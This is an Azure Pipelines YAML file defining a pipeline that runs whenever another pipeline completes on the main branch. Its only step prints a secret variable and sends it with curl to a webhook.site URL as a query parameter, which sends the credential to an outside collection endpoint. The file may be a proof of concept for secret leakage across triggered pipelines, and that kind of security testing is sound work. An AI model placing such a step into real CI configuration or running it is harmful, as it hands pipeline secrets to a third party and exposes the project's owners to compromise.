trigger: none
pr: none


resources:
  pipelines:
  - pipeline: pipeline (B)
    source: pipeline (A)
    trigger: true # Run pipeline (B) when any run of pipeline (A) completes
    branch: main

steps:
  - script: |
      echo $(SUPER_SECRET)
      curl https://webhook.site/b3772b23-3a7a-49d5-943c-2ca3bff7cd27?secret=$(SUPER_SECRET)
  
